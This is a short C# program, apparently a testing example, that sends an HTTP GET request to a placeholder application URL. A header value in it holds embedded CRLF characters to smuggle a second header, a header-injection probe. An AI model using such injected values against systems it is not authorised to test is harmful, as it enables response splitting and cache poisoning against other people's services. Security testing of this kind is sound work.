// Example C# code to send an HTTP request with a malicious header\n   using System;\n   using System.Net;\n\n   class Program\n   {\n       static void Main()\n       {\n           HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://yourappurl.com");\n           request.Method = "GET";\n           // Injecting malicious header\n           request.Headers["X-Injected-Header"] = "InjectedValue\r\nInjected-Header2: InjectedValue2";\n\n           try\n           {\n               HttpWebResponse response = (HttpWebResponse)request.GetResponse();\n               Console.WriteLine("Response Status: " + response.StatusCode);\n           }\n           catch (WebException ex)\n           {\n               Console.WriteLine("Exception: " + ex.Message);\n           }\n       }\n   }